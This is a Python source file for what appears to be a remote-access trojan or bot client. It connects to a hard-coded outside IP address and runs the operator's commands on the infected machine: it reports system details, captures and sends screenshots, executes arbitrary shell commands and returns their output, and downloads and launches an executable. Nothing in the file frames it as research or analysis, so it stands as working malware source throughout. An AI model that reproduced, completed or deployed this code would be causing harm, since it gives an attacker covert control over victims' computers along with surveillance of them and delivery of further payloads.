import socket
import os
import subprocess
from multiprocessing import Process,current_process
from threading import Thread
import struct
import platform
from time import sleep
import pyautogui
from json import load
from urllib import request

def create_botserver():
    ip = load(request.urlopen("https://api.ipify.org/?format=json"))['ip']
    port = 2000
    ss = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    ss.bind((ip,port))
    ss.listen()
    while True:
        con,addr = ss.accept()
        con.send("ALIVE".encode())
        resp = con.recv(1024).decode()
        if(resp == "RESTART"):
            main()
        elif(resp == "KILL"):
            quit()
        elif(resp == "OK"):
            continue
        else:
            pass

def start_session(s):
    while True:
        try:
            cmd = s.recv(1024).decode()

            if "OS" in cmd:
                os_name = platform.system()
                os_processor = platform.processor()
                os_info = platform.platform()
                os_user = platform.node()
                details = "Operating System : %s\n"%(str(os_name))
                details += "Processor : %s\n"%(str(os_processor))
                details += "Version : %s\n"%(str(os_info))
                details += "User(node) : %s\n"%(str(os_user))
                s.send(details.encode())

            if "REGISTRY" in cmd:
                try:

                    pass #BETA
                except:
                    s.send("FAILED".encode())

            if "screenshot" in cmd:
                try:
                    extension = ".png"
                    pyautogui.screenshot("HP" + extension)
                    file = open("HP"+extension,'rb')
                    data = file.read()
                    file.close()
                    size = len(data)
                    s.send("OK".encode())
                    sleep(1)
                    s.send(str(size).encode())
                    sleep(1)
                    s.send(data)
                except Exception as e:
                    print("[*] Error : %s"%(str(e)))
                    s.send("FAILED".encode())

            if "CHECK" in cmd:
                s.send("YES".encode())

            if "shell" in cmd:
                cmd = cmd.strip("shell ")
                try:
                    pipe = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
                    output = pipe.stdout.read()
                    s.send("DONE".encode())
                    sleep(1)
                    s.send(output)
                except Exception as e:
                    print("[*] Shell execution failed")
                    print("[*] Error : %s"%(str(e)))
                    s.send("FAILED".encode())
                    pass

            if "restart" in cmd:
                try:
                    payload = s.recv(4096000)
                    file = open("tmp.exe",'wb')
                    file.write(payload)
                    file.close()
                    path = os.getcwd()
                    subprocess.Popen("%s/tmp.exe",creationflags=subprocess.CREATE_NEW_PROCESS_GROUP,close_fds=True)
                    s.send("DONE".encode())
                except Exception as e:
                    print("Error : %s"%(str(e)))

            if "execute" in cmd:
                cmd = cmd.strip("execute ")
                try:
                    pipe = subprocess.call(cmd,shell=True)
                    if(pipe == 0):
                        s.send("SUCCESS".encode())
                    else:
                        s.send("FAILED".encode())
                except:
                    pass
        #    cmd_size = struct.unpack("<H",cmd[:2])
        #    cmd = struct.unpack("<%ds"%(cmd_size[0]),cmd[2:]).decode()
        #    if "execute" in cmd:
        #        cmd = cmd.strip("execute ")

        except Exception as e:
            print(str(e))

def main():
    while True:
        try:
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect(("142.93.197.240",2003))
            conn_process = Thread(target=start_session,args=(s,))
            conn_process.start()
            conn_process.join()
        except socket.error:
            main()
        except:
            print("Unknown error occured")

if __name__ == '__main__':
    #path = os.getcwd()
    #subprocess.Popen("%s/bot.exe"%(path),creationflags=subprocess.CREATE_NEW_PROCESS_GROUP,close_fds=True)

    main_thread = Thread(target=main,args=())
    #main_thread.setmDaemon(True)
    main_thread.start()
